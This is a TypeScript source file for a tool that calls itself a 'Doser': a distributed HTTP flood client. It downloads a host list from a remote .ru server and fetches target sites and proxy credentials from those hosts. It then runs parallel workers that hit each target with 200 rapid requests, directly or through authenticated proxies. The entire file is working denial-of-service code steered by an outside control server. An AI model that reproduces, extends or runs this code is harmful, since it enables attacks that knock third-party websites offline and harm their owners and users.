import axios from 'axios'
import { EventEmitter } from 'events'

interface ProxyData {
  auth: string
  id: number
  ip: string
}

interface SiteData {
  atack: number
  id: number
  // eslint-disable-next-line camelcase
  need_parse_url: number
  page: string
  // eslint-disable-next-line camelcase
  page_time: number
  url: string
}

interface TargetData {
  site: SiteData
  proxy: Array<ProxyData>
}

export type DoserEventType = 'atack' | 'error'

export class Doser {
  private onlyProxy: boolean
  private hosts: Array<string> = []
  private working: boolean
  private workers: number
  private eventSource: EventEmitter

  constructor (onlyProxy: boolean, workers: number) {
    this.onlyProxy = onlyProxy
    this.working = false
    this.workers = workers
    this.eventSource = new EventEmitter()
  }

  async loadHostsFile () {
    const response = await axios.get('http://rockstarbloggers.ru/hosts.json')
    this.hosts = response.data as Array<string>
  }

  async getRandomTarget () {
    while (this.working) { // escaping unavailable hosts
      try {
        const host = this.hosts[Math.floor(Math.random() * this.hosts.length)]
        const response = await axios.get(host, { timeout: 10000 })
        if (response.status !== 200) continue
        return response.data as TargetData
      } catch (e) {
        console.log('Error while loading hosts')
        console.log(e)
      }
    }
    return null
  }

  start () {
    this.working = true
    for (let i = 0; i < this.workers; i++) {
      setImmediate(() => void this.worker.bind(this)())
    }
  }

  stop () {
    this.working = false
  }

  listen (event: DoserEventType, callback: (data: any)=>void) {
    this.eventSource.addListener(event, callback)
  }

  private async worker () {
    while (this.working) {
      const target = await this.getRandomTarget()
      if (target === null) break

      // check if direct request can be performed
      let directRequest = false
      if (!this.onlyProxy) {
        try {
          const response = await axios.get(target.site.page, { timeout: 10000 })
          directRequest = response.status === 200
        } catch (e) {
          this.eventSource.emit('error', { type: 'error', error: e })
          directRequest = false
        }
      }

      const ATACKS_PER_TARGET = 200

      for (let atackIndex = 0; (atackIndex < ATACKS_PER_TARGET) && this.working; atackIndex++) {
        this.eventSource.emit('atack', { type: 'atack', url: target.site.page })
        if (directRequest) {
          await axios.get(target.site.page, { timeout: 5000 })
        } else {
          const proxy = target.proxy[Math.floor(Math.random() * target.proxy.length)]
          const proxyAddressSplit = proxy.ip.split(':')
          const proxyIP = proxyAddressSplit[0]
          const proxyPort = parseInt(proxyAddressSplit[1])
          const proxyAuthSplit = proxy.auth.split(':')
          const proxyUsername = proxyAuthSplit[0]
          const proxyPassword = proxyAuthSplit[1]

          await axios.get(target.site.page, {
            timeout: 5000,
            proxy: {
              host: proxyIP,
              port: proxyPort,
              auth: {
                username: proxyUsername,
                password: proxyPassword
              }
            }
          })
        }
      }
    }
  }
}
